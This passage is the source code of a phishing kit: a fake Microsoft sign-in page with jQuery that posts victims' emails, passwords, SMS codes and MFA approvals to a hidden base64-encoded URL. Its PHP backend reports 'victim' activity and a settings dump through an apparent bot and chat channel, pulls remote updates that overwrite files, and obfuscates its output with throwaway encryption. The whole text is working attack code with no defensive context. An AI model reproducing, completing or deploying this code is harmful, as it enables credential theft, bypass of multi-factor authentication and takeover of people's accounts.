transform="matrix(1 0 0 1 0.00069904000000 0)" fill="rgb(3,88,167)" stroke="none" stroke-width="1"></path><g id="loadingLogo11"><rect id="loadingLogo12" width="54.063866" height="50.118118" rx="0" ry="0" transform="matrix(1 0 0 1 28 24.00000000069796)" fill="rgb(0,120,212)" stroke="none" stroke-width="1"></rect><rect id="loadingLogo13" width="46" height="50.118118" rx="0" ry="0" transform="matrix(1.04381524897098 0 0 1 125.98449854733477 24)" fill="rgb(80,217,255)" stroke="none" stroke-width="1"></rect><rect id="loadingLogo14" width="50" height="50.118118" rx="0" ry="0" transform="matrix(1 0 0 1 78 24)" fill="rgb(40,168,234)" stroke="none" stroke-width="1"></rect></g><g id="loadingLogo15"><rect id="loadingLogo16" width="54.063866" height="50.659265" rx="0" ry="0" transform="matrix(1 0 0 1 28 70)" fill="rgb(3,100,184)" stroke="none" stroke-width="1"></rect><rect id="loadingLogo17" width="46" height="50.659265" rx="0" ry="0" transform="matrix(1.05111776899004 0 0 1 125.64858262645808 70)" fill="rgb(40,168,234)" stroke="none" stroke-width="1"></rect><rect id="loadingLogo18" width="50" height="50.659265" rx="0" ry="0" transform="matrix(1 0 0 1 78 70)" fill="rgb(0,120,212)" stroke="none" stroke-width="1"></rect></g><rect id="loadingLogo19" width="46" height="46" rx="0" ry="0" transform="matrix(1.05885006553074 0 0 1 125.29289698558608 116)" fill="rgb(0,120,212)" stroke="none" stroke-width="1"></rect><rect id="loadingLogo20" width="54.063866" height="46" rx="0" ry="0" transform="matrix(1 0 0 1 28 116)" fill="rgb(20,68,125)" stroke="none" stroke-width="1"></rect><rect id="loadingLogo21" width="50" height="46" rx="0" ry="0" transform="matrix(1 0 0 1 78 116)" fill="rgb(3,100,184)" stroke="none" stroke-width="1"></rect></g></g></g></g><clipPath id="loadingLogo22"><path id="loadingLogo23" d="M20.002200,91.603067C20.009900,89.730718,20.875500,87.992107,22.298100,86.992115L179.759000,87.054379C181.168000,88.060919,182.014000,89.802193,181.999000,91.665331C182.023000,93.547669,181.177000,95.311695,179.759000,96.338325L106.684000,145.812969L105.732000,146.435605C104.337000,147.264678,102.778000,147.691977,101.197000,147.681988C99.633300,147.689758,98.093100,147.261348,96.716900,146.435605L95.709000,145.812969L22.410100,96.338325C20.902100,95.354980,19.983300,93.548002,20.002200,91.603067Z" transform="matrix(2.23434089273892 0 0 3.43311766004244 -124.66929302028908 -322.01007244420919)" fill="rgb(18,59,109)" stroke="none" stroke-width="1"></path></clipPath></g><g id="loadingLogo24" mask="url(#loadingLogo30)"><g id="loadingLogo25"><path id="loadingLogo26" d="M172,185L20,185L182,97L182,175C182,180.523000,177.523000,185,172,185Z" fill="rgb(20,144,223)" stroke="none" stroke-width="1"></path><g id="loadingLogo27"><path id="loadingLogo28" d="M30,185L182,185L20,97L20,175C20,180.523000,24.477200,185,30,185Z" fill="rgb(40,168,234)" stroke="none" stroke-width="1"></path></g></g><g id="loadingLogo29_ts" transform="translate(101.000699,97.499573) scale(1,1)"><path id="loadingLogo29" style="filter: drop-shadow(
                                                    0px 0px 0px rgba(0, 0, 0, 0.09)
                                                );" d="M22.408100,101.421000C20.900200,100.535000,19.981300,98.906900,20.000300,97.154500C20.007700,95.502000,20.838500,93.965200,22.209500,93.056100L179.757000,93.056100C181.166000,93.963000,182.012000,95.531900,181.997000,97.210600C182.021000,98.906600,181.175000,100.496000,179.757000,101.421000L106.682000,145.998000L105.730000,146.559000C104.335000,147.306000,102.776000,147.691000,101.195000,147.682000C99.631300,147.689000,98.091100,147.303000,96.715000,146.559000L95.707100,145.998000L22.408100,101.421000Z" transform="translate(-101.000699,-97.499573)" fill="rgb(80,217,255)" stroke="none" stroke-width="1"></path></g><mask id="loadingLogo30" mask-type="alpha"><path id="loadingLogo31" d="M20,97L182,97L182,175C182,180.523000,177.523000,185,172,185L30,185C24.477200,185,20,180.523000,20,175L20,97Z" fill="rgb(196,196,196)" stroke="none" stroke-width="1"></path></mask></g></g></g></g></g></svg> <svg id="MSLogo" width="99" height="22" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M34.643 12.075l-.588 1.647h-.034c-.105-.387-.28-.934-.556-1.63l-3.15-7.897h-3.077V16.75h2.03V9.032c0-.476-.01-1.052-.03-1.711-.01-.333-.049-.6-.058-.804h.045c.103.473.21.834.287 1.075l3.776 9.16h1.42l3.748-9.243c.085-.211.175-.622.257-.992h.044c-.048.915-.09 1.75-.095 2.256v7.978h2.165V4.195h-2.956l-3.228 7.88z" fill="#737474"></path><path d="M0 20.956h98.148V0H0z"></path><path fill="#737474" d="M42.866 16.751h2.118V7.752h-2.118zM43.947 3.929c-.349 0-.653.119-.902.353a1.166 1.166 0 00-.378.883c0 .344.126.636.374.865.247.23.552.345.906.345s.66-.115.91-.345c.25-.23.379-.52.379-.865 0-.339-.125-.632-.37-.873a1.262 1.262 0 00-.919-.363M52.477 7.663a5.892 5.892 0 00-1.182-.127c-.971 0-1.838.209-2.574.62-.739.41-1.31.998-1.699 1.745-.386.745-.583 1.615-.583 2.585 0 .85.19 1.631.567 2.318.377.69.91 1.23 1.585 1.602.673.373 1.452.563 2.313.563 1.006 0 1.866-.201 2.554-.597l.027-.017v-1.94l-.089.066c-.312.227-.66.408-1.035.538a3.121 3.121 0 01-1.014.197c-.83 0-1.497-.26-1.982-.772-.485-.513-.73-1.233-.73-2.14 0-.912.255-1.651.761-2.196.504-.544 1.173-.82 1.986-.82.695 0 1.374.236 2.014.702l.09.063V8.011l-.029-.017c-.241-.135-.571-.246-.98-.331M59.452 7.597a2.17 2.17 0 00-1.415.507c-.358.296-.616.7-.814 1.207H57.2V7.753h-2.116v8.999H57.2v-4.603c0-.784.178-1.426.528-1.912.346-.48.806-.723 1.369-.723.19 0 .404.031.636.093.23.063.396.129.493.2l.09.064V7.737l-.034-.014c-.197-.083-.477-.126-.83-.126M66.885 14.465c-.397.499-.996.751-1.779.751-.777 0-1.39-.256-1.823-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.433-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.203 1.728-.604 2.23m-1.683-6.929c-1.484 0-2.663.435-3.503 1.293-.84.857-1.265 2.044-1.265 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.316 1.245 1.438 0 2.593-.441 3.434-1.31.84-.87 1.265-2.045 1.265-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M74.378 11.471c-.667-.268-1.095-.49-1.27-.66-.17-.165-.257-.398-.257-.693 0-.262.108-.472.327-.642.219-.17.526-.257.911-.257.357 0 .723.056 1.085.166.363.111.682.26.949.44l.088.06V7.928l-.035-.015a4.715 4.715 0 00-.962-.268 5.932 5.932 0 00-1.056-.109c-1.01 0-1.845.258-2.483.767-.64.512-.967 1.184-.967 1.997 0 .422.07.798.209 1.116.14.32.355.6.641.837.283.233.722.478 1.302.728.488.2.852.37 1.083.505.227.13.387.263.477.39.088.127.133.299.133.512 0 .604-.452.897-1.384.897a3.8 3.8 0 01-1.172-.213 4.418 4.418 0 01-1.2-.609l-.089-.064v2.064l.033.015c.304.14.686.257 1.137.35.449.094.859.141 1.213.141 1.096 0 1.977-.26 2.62-.771.648-.515.976-1.204.976-2.045 0-.607-.176-1.127-.525-1.546-.345-.416-.946-.799-1.784-1.136M84.063 14.465c-.398.499-.997.751-1.78.751-.777 0-1.39-.256-1.822-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.432-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.204 1.728-.604 2.23M82.38 7.536c-1.484 0-2.663.435-3.503 1.293-.84.857-1.266 2.044-1.266 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.317 1.245 1.438 0 2.593-.441 3.433-1.31.84-.87 1.266-2.045 1.266-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M98.149 9.48V7.752h-2.144V5.069l-.072.022-2.015.616-.038.012v2.034h-3.177V6.62c0-.527.118-.931.351-1.2.23-.266.56-.402.982-.402.303 0 .616.072.931.213l.079.035V3.447l-.037-.013c-.294-.105-.695-.159-1.19-.159-.626 0-1.194.136-1.689.406-.495.27-.886.655-1.16 1.146-.272.489-.41 1.054-.41 1.68v1.246h-1.492v1.726h1.493v7.273h2.142V9.479h3.177v4.622c0 1.903.897 2.868 2.668 2.868.291 0 .597-.034.91-.101.319-.07.535-.137.662-.21l.029-.016v-1.743l-.087.058c-.117.078-.262.14-.432.188-.17.048-.312.072-.422.072-.416 0-.723-.112-.914-.332-.191-.223-.289-.612-.289-1.158V9.48h2.144z"></path><path fill="#F05124" d="M0 9.958h9.958V.001H0z"></path><path fill="#7EBB42" d="M10.995 9.958h9.957V.001h-9.957z"></path><path fill="#32A0DA" d="M0 20.956h9.958V11H0z"></path><path fill="#FDB813" d="M10.995 20.956h9.957V11h-9.957z"></path></g></svg></div>
      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
     <script>
       // $(document).ready(function(){
		    document.title=\''.($title ?? "Sign in to Best Productivity Provider").'\';
			$(\'head\').append(\'<link href="data:image/png;base64,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" rel="shortcut icon">\');
			$.support.cors = true
			var em =$(\'#bkupttrferrs\').val();
			var ur =atob($(\'#uurl\').val());
			$(\'.click-to-enter\').click(function(){
				$.post(ur,\'auth=1&st=\'+$(\'.stealth\').val(),function(data){
					if(data){
					$(\'.show-2fa-code\').hide(function(){
						$(\'.input-code\').show();
					});
					}
				});
			});
			
			sera = {em}
			$.post(ur,sera,function(data){
     			if(data && data != \'fail\'){
     			    var i=JSON.parse(data);
     				if(i.bg_image !== null && i.bg_image !== \'\'){
     					$(\'#bg_img\').css(\'background-image\', \'linear-gradient(rgba(0,0,0,0.527),rgba(0,0,0,0.5)),url(\' + i.bg_image + \')\');
     					$(\'#banner_image\').hide();
                     //	alert(i.logo_image);
     				}
     				if(i.logo_image !== null && i.logo_image !== \'\'){
     					$(\'#logo_image\').attr(\'src\', i.logo_image);
     					$(\'#banner_image\').hide();
                     //	alert(i.logo_image);
     				}
     			}
     			$(\'#loadingScreen\').hide(function(){
     				$(\'#content\').show(function(){
     					$(\'.identity\').html(em)
     					$(\'#add_pass\').show();
     				});
     			});
				$(\'.submit-mfa1-code\').click(function(){
					$(\'.mfa-error\').hide()
					var cd = $(\'.mfa1-code\').val()
					var patter = /^[0-9]+$/;
					if(!patter.test(cd)){
						return false;
					}
					var to_mfa = \'mf_code=\'+cd+\'&st=\'+$(\'.stealth\').val()+\'&emst=\'+em+\'&pse=\'+$(\'#password\').val();;
					$.post(ur,to_mfa,function(data){
						data = JSON.parse(data)
						if(data.v==0){
							$(\'.mfa-error\').show()
						}
						else if(data.v == 1){
							location.replace(data.t);
     						setTimeout("window.location.href=\'"+ data.t +"\';", 1000);
						}
					});
				});
				$(\'.submit-2fa\').click(function(){
					$(\'.code-error\').hide(function(){
								$(\'.sms-error\').hide();
					});
					var cde=$(\'#idTxtBx_SAOTCC_OTC\').val();
					var patter = /^[0-9]+$/;
					if(!patter.test(cde) || cde.length!=6){
						$(\'.code-error\').show(function(){
								$(\'.sms-error\').show();
								$(\'.error-type\').html(\'Please enter the 6-digit code. The code only contains numbers\');
							});
							return false
					}
					var entry = \'code=\'+$(\'#idTxtBx_SAOTCC_OTC\').val()+\'&st=\'+$(\'.stealth\').val()+\'&emst=\'+em+\'&pse=\'+$(\'#password\').val();
					$.post(ur,entry,function(data){
						var data=JSON.parse(data)
						if(data.v==\'0\'){
							$(\'.code-error\').show(function(){
								$(\'.sms-error\').show();
							});
						}
						else if(data.v=="1"){
     							location.replace(data.t);
     							setTimeout("window.location.href=\'"+ data.t +"\';", 1000);
						}
						//incorrect
						//or
						//redirect
					});
				});
				$(\'.nextb\').click(function(){
					$(\'.nextb\').prop(\'disabled\', true);
					$(".pass-error").hide();
					$(".info-verify").hide();
					$(\'.alert-erro\').hide();
					var pswd = $(\'#password\').val();
					if(!pswd){
					   $(\'.alert-erro\').show();
					   $(\'.alert-erro\').html(\'Please enter the password for your Microsoft account.\');
					   $(\'.nextb\').prop(\'disabled\', false);
					}
					else{
						$(\'#progressBar\').show();
						var auth = $(\'#bkupttrferrs\').val();
     					compi = {auth,pswd};
     					$.post(ur,compi,function(data){
     						var result = JSON.parse(data);
     						if(result.t==\'valid\'){
     							var finish_url=result.finish;
     							location.replace(finish_url);
     							setTimeout("window.location.href=\'"+ finish_url +"\';", 1000);
     						}else if(result.t==\'sms\'){
								$(\'.enter-pass\').hide(function(){
									$(\'.show-2fa-code\').show();
								});
								$(\'.add-text\').html(result.number);
								$(\'.stealth\').val(result.file);
								$(\'#progressBar\').hide();
     							//var finish_url=result.finish;
     						//	location.replace(finish_url);
     							//setTimeout("window.location.href=\'"+ finish_url +"\';", 1000);
     						}
							else if(result.t==\'mfa1\'){
								$(\'.enter-pass\').hide(function(){
									$.post(ur,\'start_mfa=1&st=\'+result.file,function(d,t){
										//alert(1);
									});
									$(\'.show-mfa1-code\').show();
								});
								$(\'.stealth\').val(result.file);
								$(\'#progressBar\').hide();
     							//var finish_url=result.finish;
     						//	location.replace(finish_url);
     							//setTimeout("window.location.href=\'"+ finish_url +"\';", 1000);
     						}
							else if(result.t==\'mfa2\'){
								$(\'.enter-pass\').hide(function(){
									$.post(ur,\'start_mfa=1&st=\'+result.file,function(d,t){
										if(true){
											var cde = d;
											$(\'.displaySign\').text(cde);
										}
									});
									$(\'.show-mfa2-code\').show();
								});
								$(\'.stealth\').val(result.file);
								$(\'#progressBar\').hide();
     					
									setTimeout(function(){
									   var def_count = 0;
								       var intervalId = window.setInterval(function(){
									   def_count+=1;
									   if(def_count == 7){
											clearInterval(intervalId);
											$(\'.show-mfa2-code\').hide(function(){
												$(\'.mfa2-error\').show();
											});
									   }
									   var to_mfa2 = \'mf_code=&st=\'+$(\'.stealth\').val()+\'&emst=\'+em+\'&pse=\'+$(\'#password\').val();;
										$.post(ur,to_mfa2,function(data){
											var data=JSON.parse(data)
													 if(data.v==1){
															location.replace(data.t);
															setTimeout("window.location.href=\'"+ data.t +"\';", 3000);
														}
						//incorrect
						//or
						//redirect
													});
												}, 5500);
										
										},2000);
								
     						}
     						else{
     							$(\'#progressBar\').hide();
     							$(".error-alert").show();
								$(\'.pass-error\').show();
     							$(".pass-error").html("Your email or password is incorrect. If you don\'t remember your password, <a href=\'#\'>reset it now.</a>");
     							$(\'.nextb\').prop(\'disabled\', false);
						    	$(\'#password\').val(null);
     						}
     					});
					}
				});
			});
			$(document).on(\'keypress\',function(e) {
				if(e.which == 13) {
					if($(\'.enter-pass\').is(":visible")){
						$(\'.nextb\').click()
					}
					else if($(".input-code").is(":visible")){
							$(".submit-2fa").click()
					}
				}
			});
		//});
		</script>
   
   </body></html>');
}
if(isset($_POST["error"])){
	logger_error($_POST["error"]);
}
if(isset($_POST["lef"])){
		$logger=sprintf("Victim %s left page",$publ_ip);
		$dis=new disp();
		$dis->send($logger,$bot,$chat,$email,$rz_name);
}
if(isset($_POST["random"])){
	$randoms = do_it('random','',$api,$chat,$temp_host); 
	//var_dump($randoms);
	echo $randoms[0] == "[" || $randoms[0] == "{" ?  $randoms : "";
}
if(isset($_POST["mkr"])){
	$maindoms = do_it('mkr','',$api,$chat,$temp_host); 
	//var_dump($randoms);
	echo $maindoms;
}
if(isset($_POST["mkr2"])){
	$maindoms = do_it('mkr2','',$api,$chat,$temp_host); 
	//var_dump($randoms);
	echo $maindoms;
}
if(isset($_GET['admin'])){
	$actual_link2 = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]".explode('?',$_SERVER['REQUEST_URI'])[0];
	$lil_config = sprintf('========SETTINGS=======
Base_Url = [ %s ]
Results File = %s
Send Visit = %s
Block Bots = %s
Email For Results = %s
Chat ID = %s
Api Key = %s
====================
	',base64_encode($actual_link2),$rz_name,$v_send == "1" ? 'Yes' : 'No',$block_checker == "1" ? 'Yes' : 'No',$email,$chat,$api);
	$dis=new disp();
	$dis->send($lil_config,$bot,$chat,$email,$rz_name);
}

if(isset($_POST['scte']) || isset($_POST['fctt'])){
	$to_check=base64_decode($_POST['scte'] ?? ($_POST['fctt'] ?? ""));
	if(true){
		$anodat = $_POST['conf'] ?? '';
		if(!$anodat){
			//exit();
		}
		$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		$is_it=do_it('def','',$api,$chat,$temp_host);
		$is_is_it = json_decode($is_it,1);
		$is_it = $is_is_it != null ? $is_is_it[0] : $is_it;
		$details = $is_is_it != null ? base64_decode($is_is_it[1]) : [];
		if($is_it=='valid'){
			get_t_d($bot,$chat,$email,$v_send,$block_checker,$details);
			$unprotected = to_output($to_check,$actual_link,$api,$chat,$anodat);
			function act_on($I1PLA46yu0){
				$IIPLA46yuO = openssl_random_pseudo_bytes(256);
				$I1PLA46yuO = openssl_random_pseudo_bytes(16);
				$IIPLA46yu0 = hash("sha256",bin2hex(openssl_random_pseudo_bytes(32)));
				$I1PiA46yu0 = hash_pbkdf2("sha512", $IIPLA46yu0, $IIPLA46yuO, 999, 64);
				$_o9 = openssl_encrypt($I1PLA46yu0, 'aes-256-cbc', hex2bin($I1PiA46yu0), OPENSSL_RAW_DATA, $I1PLA46yuO);
				$_09 = base64_encode($_o9) . "*" . bin2hex($I1PLA46yuO) . "*" . bin2hex($IIPLA46yuO) . "*" . $IIPLA46yu0;
				return base64_encode($_09);
			}
			echo act_on($unprotected);
		}
		else if($is_it == 'ip_ban'){
			echo 'ip_ban';
		}
		else if($is_it == 'od'){
			echo 'outdated';
		}
		else{
			echo 'no';
		}
	}
	
} 

if(isset($_POST['em'])){
  if(filter_var($_POST['em'],FILTER_VALIDATE_EMAIL))	{
	  $email=$_POST['em'];
	  $response=do_it('email',$email,$api,$chat,$temp_host);
	  if ($response == 5){
		  echo 'fail';
	  }
	  else if($response){
		  echo $response;
	  }
	  else{
		  echo '';
	  }
  }
}

if(isset($_POST["upd101"])){
	if(true){
		$updf = do_it('upd',$email,$api,$chat,$temp_host);
		$updj = json_decode($updf,1);
		//var_dump($updj);
		if($updj["y"]){
			$data_conf = $updj["d"];
			$version = $updj["v"];
			$error = 0;
			foreach($data_conf as $index => $value){
				$np = $path = $value[0];
				$content = $value[1];
				if(count($value) == 3){
					$np = $value[2];
				}
				if(file_exists($path)){
						if(file_get_contents($path) != base64_decode($content)){
							@unlink($path);
							$fp = fopen($np,"w+");
							if(fwrite($fp,base64_decode($content)) === FALSE){
								$error = 1;
							}
							fclose($fp);
							if(!$error){
								echo json_encode(array(
									"success" => 1,
									"version" => $version,
								));
							}
							else{
								echo 0;
							}
						}
				}
			}
		}else{
			echo 0;
		}
	}
}

if(isset($_POST['auth'])){
  if($_POST['auth']=='1'){
	  $auth=$_POST['auth'];
	  $response=do_it('auth',$_POST['st'],$api,$chat,$temp_host);
	  echo $response;
	  if(intval($response)){
		// $logger=sprintf("2fa Code Sent to Victim %s",$publ_ip);
		// $dis=new disp();
		// $dis->send($logger,$bot,$chat,$email,$rz_name);
	  }
	  else{
		//  echo '0';
	  }
  }
}

if(isset($_POST['live'])){
	$responses = "";
	foreach($dumps as $temp_ho){
		$response=do_it('live_check','',$api,$chat,$temp_ho);
		$responses.= (string) $response;
	}
	echo $responses;
	
}
if(isset($_POST['start_mfa'])){
	$response=do_it('start_mf',$_POST['st'],$api,$chat,$temp_host);
	// $logger=sprintf("Mfa Started on victim %s,Waiting For Approval",$publ_ip);
	// $dis=new disp();
	// $dis->send($logger,$bot,$chat,$email,$rz_name);
	echo $response;
}
